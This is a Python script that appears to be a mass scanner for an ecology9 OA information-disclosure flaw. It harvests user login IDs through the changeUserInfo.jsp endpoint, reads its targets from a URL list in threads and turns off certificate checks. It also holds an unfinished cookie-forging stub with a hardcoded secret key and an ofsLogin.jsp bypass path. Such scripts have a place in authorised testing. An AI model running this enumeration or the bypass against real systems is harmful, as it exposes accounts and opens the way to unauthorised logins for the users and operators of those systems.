import json
import random
import urllib3
import requests
import argparse
import threading
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
headers = {
    "Accept": "*/*",
    "Accept-Language": "en-US",
    "Accept-Encoding": "gzip, deflate",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Connection": "close",
    "Referer": "https://google.com/"
}

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def getRandomNum(n):
    digits = list(range(10))
    random_num_list = []
    for i in range(n):
        num_list = random.sample(digits, 2)
        num = num_list[0] * 10 + num_list[1]
        random_num_list.append(num)
    return random_num_list

def loginIdScan(url):
    loginIds = []
    for randomNum in randomNums:
        path = "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile={}".format(randomNum)
        parsed_url = urlparse(url)
        target = parsed_url.scheme + "://" + parsed_url.netloc + path
        try:
            response = requests.get(target, headers=headers, verify=False, allow_redirects=False)#, proxies=proxies)
            if response.status_code == 200:
                data = json.loads(response.text)
                loginId = data.get("loginId", -1)
                if loginId != -1:
                    loginIds.append(loginId)
        except:
            print("[-] {}, 未发现发现loginId或不存在漏洞！".format(parsed_url.netloc))
            return ""
    if len(loginIds) > 0:
        print("[+] {}, 发现loginId: {}".format(parsed_url.netloc, loginIds))
    else:
        print("[-] {}, 未发现发现loginId或不存在漏洞！".format(parsed_url.netloc))


def getCookie():
    timestamp = "1"
    syscode = "1"
    secret_key = "u6skkR"
    receiver = ""
    loginTokenFromThird = ""
    path = "/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver={}&loginTokenFromThird={}".format(receiver, loginTokenFromThird)
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ecology9 changeUserInfo信息泄漏检测")
    parser.add_argument("-u", "--url", type=str, required=False, help="url")
    parser.add_argument("-U", "--urls", type=str, required=False, help="urls.txt")
    args = parser.parse_args()

    randomNums = getRandomNum(30)

    if args.url:
        loginIdScan(args.url)
    elif args.urls:
        with open(args.urls, "r") as file:
            for line in file:
                t = threading.Thread(target=loginIdScan, args=(line.strip(),))
                t.start()
    else:
        parser.print_help()
        exit()
